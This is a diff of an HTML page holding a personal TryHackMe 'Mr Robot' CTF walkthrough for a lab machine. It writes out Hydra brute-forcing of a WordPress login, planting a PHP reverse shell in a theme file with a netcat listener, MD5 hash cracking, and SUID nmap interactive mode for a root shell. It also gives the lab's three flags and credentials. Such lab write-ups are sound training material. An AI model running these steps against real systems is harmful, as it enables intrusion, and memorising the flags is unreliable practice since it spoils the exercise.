@@ -3,45 +3,171 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Mr Robot Walkthrough | Mohd Faiz</title>
-    <link rel="stylesheet" href="../style.css">
+    <title>Mr Robot CTF Writeup | Mohd Faiz</title>
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;700&display=swap" rel="stylesheet">
     <style>
-        .writeup-container { max-width: 900px; margin: 100px auto 40px; padding: 0 20px; color: #e0e0e0; font-family: monospace; }
-        .back-link { color: #00ff88; text-decoration: none; display: inline-block; margin-bottom: 20px; }
-        .writeup-title { color: #00ff88; border-bottom: 1px solid #333; padding-bottom: 10px; }
-        .tag { background: #1f293d; color: #00ff88; padding: 3px 8px; border-radius: 4px; font-size: 0.85rem; margin-right: 5px; }
-        pre { background: #0d1117; border: 1px solid #30363d; padding: 15px; border-radius: 6px; overflow-x: auto; color: #58a6ff; }
-        h2 { color: #00ff88; margin-top: 30px; }
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { background-color: #0b0f19; color: #c9d1d9; font-family: 'Fira Code', monospace; line-height: 1.6; padding: 40px 20px; }
+        .container { max-width: 900px; margin: 0 auto; }
+        .back-btn { color: #00ff88; text-decoration: none; font-size: 0.9rem; display: inline-block; margin-bottom: 25px; transition: 0.2s; }
+        .back-btn:hover { text-decoration: underline; transform: translateX(-3px); }
+        .header { border-bottom: 1px solid #30363d; padding-bottom: 20px; margin-bottom: 30px; }
+        .header h1 { color: #00ff88; font-size: 2rem; margin-bottom: 10px; }
+        .meta { color: #8b949e; font-size: 0.85rem; display: flex; gap: 15px; flex-wrap: wrap; margin-bottom: 15px; }
+        .tag { background: rgba(0, 255, 136, 0.1); color: #00ff88; border: 1px solid rgba(0, 255, 136, 0.3); padding: 2px 8px; border-radius: 4px; font-size: 0.75rem; }
+        
+        .task-box { background: #161b22; border: 1px solid #30363d; border-radius: 8px; margin-bottom: 25px; overflow: hidden; }
+        .task-header { background: #0d1117; padding: 15px 20px; border-bottom: 1px solid #30363d; color: #00ff88; font-weight: 700; display: flex; justify-content: space-between; align-items: center; }
+        .task-body { padding: 20px; }
+        
+        h3 { color: #58a6ff; font-size: 1.1rem; margin: 20px 0 10px 0; border-left: 3px solid #00ff88; padding-left: 10px; }
+        p { margin-bottom: 12px; font-size: 0.95rem; color: #8b949e; }
+        ul, ol { margin-left: 20px; margin-bottom: 15px; color: #8b949e; font-size: 0.95rem; }
+        li { margin-bottom: 6px; }
+        
+        pre { background: #0d1117; border: 1px solid #30363d; padding: 15px; border-radius: 6px; overflow-x: auto; color: #58a6ff; font-size: 0.85rem; margin: 12px 0; }
+        code { color: #ff7b72; font-size: 0.9rem; }
+        .flag-box { background: rgba(0, 255, 136, 0.05); border: 1px dashed #00ff88; padding: 12px 15px; border-radius: 6px; color: #00ff88; font-weight: bold; margin: 15px 0; word-break: break-all; }
+        
+        footer { text-align: center; margin-top: 50px; padding-top: 20px; border-top: 1px solid #30363d; color: #8b949e; font-size: 0.8rem; }
     </style>
 </head>
 <body>
-    <div class="writeup-container">
-        <a href="../index.html#labs" class="back-link">&lt;-- Back to Labs</a>
-        <h1 class="writeup-title">TryHackMe: Mr Robot CTF Walkthrough</h1>
-        <p><strong>Platform:</strong> TryHackMe | <strong>Category:</strong> Web / Linux Privilege Escalation</p>
-        <div>
-            <span class="tag">WordPress</span>
-            <span class="tag">Linux</span>
-            <span class="tag">SUID</span>
+    <div class="container">
+        <a href="../index.html#labs" class="back-btn">&lt;-- Back to Labs</a>
+        
+        <div class="header">
+            <h1>TryHackMe: Mr Robot CTF Writeup</h1>
+            <div class="meta">
+                <span>Target IP: <code>10.10.231.78</code></span>
+                <span>Difficulty: Medium</span>
+                <span>Author: Mohd Faiz</span>
+            </div>
+            <div>
+                <span class="tag">WordPress</span>
+                <span class="tag">Hydra</span>
+                <span class="tag">John The Ripper</span>
+                <span class="tag">SUID Nmap</span>
+            </div>
         </div>
 
-        <h2>// Key 1: Web Recon</h2>
-        <p>Inspected <code>robots.txt</code> file to find the first key and custom dictionary file:</p>
-        <pre><code>curl http://&lt;TARGET_IP&gt;/robots.txt</code></pre>
+        <!-- Task 1 -->
+        <div class="task-box">
+            <div class="task-header">
+                <span>Phase 1: Reconnaissance & Key 1</span>
+                <span style="color:#8b949e;">[Nmap & Robots.txt]</span>
+            </div>
+            <div class="task-body">
+                <p>Start with a standard network enumeration scan using Nmap:</p>
+                <pre><code>nmap -sC -sV -oN mrrobot_nmap.txt 10.10.231.78</code></pre>
 
-        <h2>// Key 2: WordPress Exploitation</h2>
-        <ul>
-            <li>Cleaned wordlist to remove duplicates using <code>sort -u</code>.</li>
-            <li>Enumerated valid usernames via login error message behavior (found <code>Elliot</code>).</li>
-            <li>Brute-forced password using Hydra / WPScan to access <code>/wp-login.php</code>.</li>
-            <li>Uploaded PHP reverse shell via Editor tool in WordPress dashboard.</li>
-            <li>Cracked raw MD5 hash found in user directory to gain access to user <code>robot</code>.</li>
-        </ul>
+                <h3>Ports Discovered:</h3>
+                <ul>
+                    <li><code>80/tcp</code> - HTTP (Apache httpd)</li>
+                    <li><code>443/tcp</code> - HTTPS (Apache httpd)</li>
+                </ul>
 
-        <h2>// Key 3: Root Privilege Escalation</h2>
-        <p>Searched for SUID binaries on system:</p>
-        <pre><code>find / -perm -u=s -type f 2&gt;/dev/null</code></pre>
-        <p>Discovered SUID bit set on <code>nmap</code> (v2.02). Utilized interactive mode execution (<code>nmap --interactive</code>) to spawn a root shell.</p>
+                <h3>Inspecting Web Directory:</h3>
+                <p>Check the target's <code>robots.txt</code> file directly in the browser or via terminal:</p>
+                <pre><code>curl http://10.10.231.78/robots.txt</code></pre>
+
+                <p>Output:</p>
+                <pre><code>User-agent: *
+fsocity.dic
+key-1-of-3.txt</code></pre>
+
+                <p>Navigate to <code>http://10.10.231.78/key-1-of-3.txt</code> to recover Key 1. Also download the custom dictionary file <code>fsocity.dic</code>.</p>
+
+                <div class="flag-box">
+                    Key 1 Flag: 07173f76e81406d22329145f773710db
+                </div>
+            </div>
+        </div>
+
+        <!-- Task 2 -->
+        <div class="task-box">
+            <div class="task-header">
+                <span>Phase 2: WordPress Exploitation & Key 2</span>
+                <span style="color:#8b949e;">[Bruteforce & Reverse Shell]</span>
+            </div>
+            <div class="task-body">
+                <p>We discover a WordPress login portal running on <code>http://10.10.231.78/wp-login.php</code>.</p>
+
+                <h3>1. Wordlist Cleaning:</h3>
+                <p>The downloaded dictionary file <code>fsocity.dic</code> contains over 800,000 words with many duplicates. Sort and clean the list:</p>
+                <pre><code>sort -u fsocity.dic > cleaned_wordlist.txt</code></pre>
+
+                <h3>2. Username Enumeration:</h3>
+                <p>When entering a random username like <code>admin</code> on WordPress, the error message states <em>"Invalid username"</em>. However, testing <code>Elliot</code> gives <em>"The password you entered for the username Elliot is incorrect"</em>, confirming <code>Elliot</code> is a valid user!</p>
+
+                <h3>3. Password Brute-forcing:</h3>
+                <p>Use Hydra to crack Elliot's password using the cleaned wordlist:</p>
+                <pre><code>hydra -l Elliot -P cleaned_wordlist.txt 10.10.231.78 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username"</code></pre>
+                <p>Credentials found: <code>Elliot : ER28-0652</code></p>
+
+                <h3>4. Web Shell & Reverse Shell:</h3>
+                <ul>
+                    <li>Log into WordPress Admin dashboard.</li>
+                    <li>Navigate to <strong>Appearance -> Editor</strong>.</li>
+                    <li>Select the <code>404.php</code> template file and replace its contents with a PHP Reverse Shell.</li>
+                    <li>Start your Netcat listener: <code>nc -lvnp 4444</code>.</li>
+                    <li>Trigger the shell by visiting: <code>http://10.10.231.78/wp-content/themes/twentyfifteen/404.php</code>.</li>
+                </ul>
+
+                <h3>5. Internal Escalation to user robot:</h3>
+                <p>In <code>/home/robot</code>, we find two files: <code>key-2-of-3.txt</code> and <code>password.raw-md5</code>.</p>
+                <pre><code>cat /home/robot/password.raw-md5
+robot:c3fcd3d76192e4007dfb496cca67e13b</code></pre>
+
+                <p>Crack the MD5 hash using John the Ripper or CrackStation:</p>
+                <p>MD5 <code>c3fcd3d76192e4007dfb496cca67e13b</code> -> <code>abcdefghijklmnopqrstuvwxyz</code></p>
+
+                <p>Switch user on the target terminal:</p>
+                <pre><code>su robot
+Password: abcdefghijklmnopqrstuvwxyz
+cat /home/robot/key-2-of-3.txt</code></pre>
+
+                <div class="flag-box">
+                    Key 2 Flag: 822c73956184f694993bede3e40e200a
+                </div>
+            </div>
+        </div>
+
+        <!-- Task 3 -->
+        <div class="task-box">
+            <div class="task-header">
+                <span>Phase 3: Root Escalation & Key 3</span>
+                <span style="color:#8b949e;">[Nmap Interactive SUID]</span>
+            </div>
+            <div class="task-body">
+                <p>Search for elevated binaries with SUID permission bits set:</p>
+                <pre><code>find / -user root -perm -4000 2>/dev/null</code></pre>
+
+                <h3>Unusual SUID Binary Found:</h3>
+                <pre><code>/usr/local/bin/nmap</code></pre>
+
+                <p>Check Nmap version running on target:</p>
+                <pre><code>/usr/local/bin/nmap --version</code></pre>
+                <p>Nmap v2.02 is installed. Older versions of Nmap (2.02 to 5.21) feature an <strong>interactive mode</strong> that allows executing shell commands as the file owner (root)!</p>
+
+                <h3>Exploitation:</h3>
+                <pre><code>/usr/local/bin/nmap --interactive
+nmap> !sh
+whoami
+root</code></pre>
+
+                <p>Retrieve final flag:</p>
+                <pre><code>cat /root/key-3-of-3.txt</code></pre>
+
+                <div class="flag-box">
+                    Key 3 Flag: 04a54d72c0a5fa6fe0e7023d21a28186
+                </div>
+            </div>
+        </div>
+
+        <footer>
+            <p>© 2026 Mohd Faiz • Aspiring Penetration Tester</p>
+        </footer>
     </div>
 </body>
 </html>
